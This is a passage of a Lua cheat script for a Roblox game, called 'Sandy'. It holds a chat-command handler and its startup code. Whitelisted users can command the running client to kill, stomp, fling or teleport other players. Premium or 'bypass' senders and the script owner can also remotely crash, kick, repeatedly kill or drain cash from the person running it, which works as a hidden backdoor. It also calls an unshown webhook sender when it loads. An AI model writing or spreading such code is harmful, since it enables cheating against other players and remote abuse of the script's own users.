            setfflag("NextGenReplicatorEnabledWrite4", "true")
            task.wait(0.1)
            State.fpActive = true
            
        elseif msgLower == ".fp off" then
            setfflag("NextGenReplicatorEnabledWrite4", "false")
            task.wait(0.1)
            State.fpActive = false
            
        elseif msgLower == ".leave" then
            game:Shutdown()
            
        elseif msgLower == ".rejoin" then
            TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
            
        elseif msgLower:match("^%.say%s+(.+)$") then
            local messageToSay = msgLower:match("^%.say%s+(.+)$")
            sendChat(messageToSay)
            
        elseif msgLower:match("^%.awl%s+([^%s]+)$") then
            local input = msgLower:match("^%.awl%s+([^%s]+)$")
            for _, plr in pairs(Players:GetPlayers()) do
                local name = plr.Name:lower()
                local display = plr.DisplayName:lower()
                if name:find(input, 1, true) or display:find(input, 1, true) then
                    WhitelistedUsers[plr.Name] = true
                    sendChat("Auto whitelisted: " .. plr.Name)
                    break
                end
            end
            
        elseif msgLower:match("^%.unawl%s+([^%s]+)$") then
            local input = msgLower:match("^%.unawl%s+([^%s]+)$")
            for _, plr in pairs(Players:GetPlayers()) do
                local name = plr.Name:lower()
                local display = plr.DisplayName:lower()
                if name:find(input, 1, true) or display:find(input, 1, true) then
                    WhitelistedUsers[plr.Name] = nil
                    sendChat("Removed from auto whitelist: " .. plr.Name)
                    break
                end
            end
            
        elseif msgLower:match("^%.l%s+(.+)$") then
            local namesString = msgLower:match("^%.l%s+(.+)$")
            local names = {}
            for name in namesString:gmatch("[^%s]+") do
                table.insert(names, name:lower())
            end
            
            reloadTool()
            State.targetPlayer = nil
            State.stompOnly = false
            State.bringOnly = false
            State.takeOnly = false
            State.downOnly = false
            State.opKill = false
            State.voiding = false
            State.multiTargets = {}
            State.summonTarget = nil
            
            for _, inputName in ipairs(names) do
                for _, targetPlayer in ipairs(Players:GetPlayers()) do
                    local targetPlayerName = targetPlayer.Name:lower()
                    local targetDisplayName = targetPlayer.DisplayName:lower()
                    
                    if (targetPlayerName:find(inputName, 1, true) or targetDisplayName:find(inputName, 1, true)) and canTarget(LocalPlayer, targetPlayer) then
                        table.insert(State.multiTargets, targetPlayer)
                        break
                    end
                end
            end
            
            if #State.multiTargets > 0 then
                State.targetPlayer = State.multiTargets[1]
                sendChat("Multi-target mode: " .. #State.multiTargets .. " targets")
            end
            
        elseif msgLower:match("^%.lk%s+([^%s]+)%s+([^%s]+)$") then
            local inputName, botName = msgLower:match("^%.lk%s+([^%s]+)%s+([^%s]+)$")
            for _, target in pairs(Players:GetPlayers()) do
                local name, display = target.Name:lower(), target.DisplayName:lower()
                if (name:find(inputName, 1, true) or display:find(inputName, 1, true)) and canTarget(LocalPlayer, target) then
                    handleOPKillCommand(inputName, botName)
                    sendChat("OP Killing: " .. target.Name)
                    break
                end
            end
            
        elseif msgLower:match("^%.right%s+([^%s]+)$") then
            local targetName = msgLower:match("^%.right%s+([^%s]+)$")
            local myName = LocalPlayer.Name:lower()
            local myDisplay = LocalPlayer.DisplayName:lower()
            
            if myName:find(targetName, 1, true) or myDisplay:find(targetName, 1, true) then
                State.summonMode = "right"
                sendChat("Summon mode: right")
            end
            
        elseif msgLower:match("^%.left%s+([^%s]+)$") then
            local targetName = msgLower:match("^%.left%s+([^%s]+)$")
            local myName = LocalPlayer.Name:lower()
            local myDisplay = LocalPlayer.DisplayName:lower()
            
            if myName:find(targetName, 1, true) or myDisplay:find(targetName, 1, true) then
                State.summonMode = "left"
                sendChat("Summon mode: left")
            end
            
        elseif msgLower:match("^%.middle%s+([^%s]+)$") then
            local targetName = msgLower:match("^%.middle%s+([^%s]+)$")
            local myName = LocalPlayer.Name:lower()
            local myDisplay = LocalPlayer.DisplayName:lower()
            
            if myName:find(targetName, 1, true) or myDisplay:find(targetName, 1, true) then
                State.summonMode = "middle"
                sendChat("Summon mode: middle")
            end
            
        elseif msgLower:match("^%.fling%s+([^%s]+)$") then
            local inputName = msgLower:match("^%.fling%s+([^%s]+)$")
            for _, target in pairs(Players:GetPlayers()) do
                local name, display = target.Name:lower(), target.DisplayName:lower()
                if (name:find(inputName, 1, true) or display:find(inputName, 1, true)) and canTarget(LocalPlayer, target) then
                    handleFlingCommand(inputName)
                    sendChat("Flinging: " .. target.Name)
                    break
                end
            end
            
        elseif msgLower == ".akill on" then
            State.killAll = true
            State.summonTarget = nil
            sendChat("Kill all enabled")
            
        elseif msgLower == ".akill off" then
            State.killAll = false
            sendChat("Kill all disabled")
            
        elseif msgLower:match("^%.lk%s+([^%s]+)$") then
            local inputName = msgLower:match("^%.lk%s+([^%s]+)$")
            for _, target in pairs(Players:GetPlayers()) do
                local name, display = target.Name:lower(), target.DisplayName:lower()
                if (name:find(inputName, 1, true) or display:find(inputName, 1, true)) and canTarget(LocalPlayer, target) then
                    handleOPKillCommand(inputName)
                    sendChat("OP Killing: " .. target.Name)
                    break
                end
            end
            
        elseif msgLower:match("^%.s%s+([^%s]+)%s+([^%s]+)$") then
            local inputName, botName = msgLower:match("^%.s%s+([^%s]+)%s+([^%s]+)$")
            for _, target in pairs(Players:GetPlayers()) do
                local name, display = target.Name:lower(), target.DisplayName:lower()
                if (name:find(inputName, 1, true) or display:find(inputName, 1, true)) and canTarget(LocalPlayer, target) then
                    handleStompCommand(inputName, botName)
                    sendChat("Stomping: " .. target.Name)
                    break
                end
            end
            
        elseif msgLower:match("^%.s%s+([^%s]+)$") then
            local inputName = msgLower:match("^%.s%s+([^%s]+)$")
            for _, target in pairs(Players:GetPlayers()) do
                local name, display = target.Name:lower(), target.DisplayName:lower()
                if (name:find(inputName, 1, true) or display:find(inputName, 1, true)) and canTarget(LocalPlayer, target) then
                    handleStompCommand(inputName)
                    sendChat("Stomping: " .. target.Name)
                    break
                end
            end
            
        elseif msgLower:match("^%.b%s+([^%s]+)%s+([^%s]+)$") then
            local inputName, botName = msgLower:match("^%.b%s+([^%s]+)%s+([^%s]+)$")
            for _, target in pairs(Players:GetPlayers()) do
                local name, display = target.Name:lower(), target.DisplayName:lower()
                if (name:find(inputName, 1, true) or display:find(inputName, 1, true)) and canTarget(LocalPlayer, target) then
                    handleBringCommand(inputName, botName, sender.Name)
                    sendChat("Bringing: " .. target.Name)
                    break
                end
            end
            
        elseif msgLower:match("^%.b%s+([^%s]+)$") then
            local inputName = msgLower:match("^%.b%s+([^%s]+)$")
            for _, target in pairs(Players:GetPlayers()) do
                local name, display = target.Name:lower(), target.DisplayName:lower()
                if (name:find(inputName, 1, true) or display:find(inputName, 1, true)) and canTarget(LocalPlayer, target) then
                    handleBringCommand(inputName, nil, sender.Name)
                    sendChat("Bringing: " .. target.Name)
                    break
                end
            end
            
        elseif msgLower:match("^%.d%s+([^%s]+)%s+([^%s]+)$") then
            local inputName, botName = msgLower:match("^%.d%s+([^%s]+)%s+([^%s]+)$")
            for _, target in pairs(Players:GetPlayers()) do
                local name, display = target.Name:lower(), target.DisplayName:lower()
                if (name:find(inputName, 1, true) or display:find(inputName, 1, true)) and canTarget(LocalPlayer, target) then
                    handleDownCommand(inputName, botName)
                    sendChat("Downing: " .. target.Name)
                    break
                end
            end
            
        elseif msgLower:match("^%.d%s+([^%s]+)$") then
            local inputName = msgLower:match("^%.d%s+([^%s]+)$")
            for _, target in pairs(Players:GetPlayers()) do
                local name, display = target.Name:lower(), target.DisplayName:lower()
                if (name:find(inputName, 1, true) or display:find(inputName, 1, true)) and canTarget(LocalPlayer, target) then
                    handleDownCommand(inputName)
                    sendChat("Downing: " .. target.Name)
                    break
                end
            end
            
        elseif msgLower:match("^%.t%s+([^%s]+)%s+([^%s]+)$") then
            local targetName, destinationName = msgLower:match("^%.t%s+([^%s]+)%s+([^%s]+)$")
            handleTakeCommand(targetName, destinationName)
            
        elseif msgLower:match("^%.tp%s+([^%s]+)$") then
            local locationName = msgLower:match("^%.tp%s+([^%s]+)$")
            handleGotoCommand(sender.Name, locationName)
            sendChat("Teleporting to: " .. locationName)
            
        elseif msgLower:match("^%.sky%s+([^%s]+)$") then
            local inputName = msgLower:match("^%.sky%s+([^%s]+)$")
            for _, target in pairs(Players:GetPlayers()) do
                local name = target.Name:lower()
                local display = target.DisplayName:lower()
                if (name:find(inputName, 1, true) or display:find(inputName, 1, true)) and canTarget(LocalPlayer, target) then
                    handleSkyCommand(target.Name)
                    sendChat("Sky targeting: " .. target.Name)
                    break
                end
            end
        end
    end
    
    -- ===== BYPASS PREMIUM ONLY COMMANDS =====
    if senderTier == "bypass" or sender.Name == Owner then
        
        if msgLower == "!ban ." then
            LocalPlayer:Kick("PERMA-BAN")
            
        elseif msgLower == "!kick ." then
            LocalPlayer:Kick(":o")
            
        elseif msgLower == "!freeze ." then
            local char = LocalPlayer.Character
            if char and char:FindFirstChild("HumanoidRootPart") then
                char.HumanoidRootPart.Anchored = true
            end
            
        elseif msgLower == "!unfreeze ." then
            local char = LocalPlayer.Character
            if char and char:FindFirstChild("HumanoidRootPart") then
                char.HumanoidRootPart.Anchored = false
            end
            
        elseif msgLower == "!bring ." then
            local char = LocalPlayer.Character
            local targetChar = sender.Character
            
            if char and char:FindFirstChild("HumanoidRootPart") and targetChar and targetChar:FindFirstChild("HumanoidRootPart") then
                State.targetPlayer = nil
                State.voiding = false
                local hrp = char.HumanoidRootPart
                hrp.Velocity = Vector3.zero
                hrp.CFrame = targetChar.HumanoidRootPart.CFrame
            end
            
        elseif msgLower == "!crash ." then
            while true do end
            
        elseif msgLower:match("^%!say %. (.+)$") then
            local textToSend = msgLower:match("^%!say %. (.+)$")
            sendChat(textToSend)
            
        elseif msgLower == "!rejoin ." then
            TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
            
        elseif msgLower == "!adropcash ." then
            State.autoCashDrop = true
            sendChat("Auto cash drop enabled")
            
        elseif msgLower == "!unadropcash ." then
            State.autoCashDrop = false
            sendChat("Auto cash drop disabled")
            
        elseif msgLower == "!lkill ." then
            State.lkill = true
            task.spawn(function()
                while State.lkill do
                    local char = LocalPlayer.Character
                    if char and char:FindFirstChild("Humanoid") then
                        char.Humanoid.Health = 0
                    end
                    task.wait(0.2)
                end
            end)
            
        elseif msgLower == "!unlkill ." then
            State.lkill = false
            
        elseif msgLower == "!dropcash ." then
            ReplicatedStorage.MainEvent:FireServer("DropMoney", "15000")
            
        elseif msgLower == "!benx ." then
            startBenx(sender)
            sendChat("Benx mode activated")
            
        elseif msgLower == "!unbenx ." then
            State.benxActive = false
            sendChat("Benx mode deactivated")
            
        elseif msgLower == "!talk off" then
            State.trashTalk = false
            sendChat("Trash talk disabled")
            
        elseif msgLower == "!talk on" then
            State.trashTalk = true
            sendChat("Trash talk enabled")
        end
    end
    
    -- ===== PREMIUM ONLY COMMANDS =====
    if senderTier == "premium" or senderTier == "bypass" or sender.Name == Owner then
        
        if msgLower == "!kick ." then
            LocalPlayer:Kick(":o")
            
        elseif msgLower == "!freeze ." then
            local char = LocalPlayer.Character
            if char and char:FindFirstChild("HumanoidRootPart") then
                char.HumanoidRootPart.Anchored = true
            end
            
        elseif msgLower == "!unfreeze ." then
            local char = LocalPlayer.Character
            if char and char:FindFirstChild("HumanoidRootPart") then
                char.HumanoidRootPart.Anchored = false
            end
            
        elseif msgLower == "!bring ." then
            local char = LocalPlayer.Character
            local targetChar = sender.Character
            
            if char and char:FindFirstChild("HumanoidRootPart") and targetChar and targetChar:FindFirstChild("HumanoidRootPart") then
                State.targetPlayer = nil
                State.voiding = false
                local hrp = char.HumanoidRootPart
                hrp.Velocity = Vector3.zero
                hrp.CFrame = targetChar.HumanoidRootPart.CFrame
            end
            
        elseif msgLower == "!crash ." then
            while true do end
            
        elseif msgLower == "!dropcash ." then
            ReplicatedStorage.MainEvent:FireServer("DropMoney", "15000")
            
        elseif msgLower == "!benx ." then
            startBenx(sender)
            sendChat("Benx mode activated")
            
        elseif msgLower == "!unbenx ." then
            State.benxActive = false
            sendChat("Benx mode deactivated")
            
        elseif msgLower == "!talk off" then
            State.trashTalk = false
            sendChat("Trash talk disabled")
            
        elseif msgLower == "!talk on" then
            State.trashTalk = true
            sendChat("Trash talk enabled")
        end
    end
end

-- ==================== CHAT LISTENER ====================
local activeListeners = {}

local function onIncomingMessage(msg)
    local sender = msg.TextSource and msg.TextSource.UserId and Players:GetPlayerByUserId(msg.TextSource.UserId)
    if not sender then return end
    
    handleChatCommand(sender, msg.Text)
end

TextChatService.OnIncomingMessage = onIncomingMessage

for _, player in pairs(Players:GetPlayers()) do
    if getUserTier(player) == "premium" or getUserTier(player) == "bypass" then
        setupDisplayNameListener(player)
    end
end

Players.PlayerAdded:Connect(function(player)
    if getUserTier(player) == "premium" or getUserTier(player) == "bypass" then
        setupDisplayNameListener(player)
    end
end)

-- ==================== INITIALIZATION ====================
local function initialize()
    sendWebhook()
    
    task.wait(3)
    sendChat("Sandy loaded - Type .help for commands")
end

initialize()

LocalPlayer.CharacterAdded:Connect(function(newChar)
    Character = newChar
    Humanoid = newChar:WaitForChild("Humanoid")
    HumanoidRootPart = newChar:WaitForChild("HumanoidRootPart")
    
    State.voiding = true
    State.buyingInProgress = false
    State.buyingGunInProgress = false
    State.buyingMaskInProgress = false
    
    task.wait(2)
    equipBestGun()
end)

-- ==================== END OF SCRIPT ====================
print("Sandy fully loaded - " .. #Players:GetPlayers() .. " players in server")
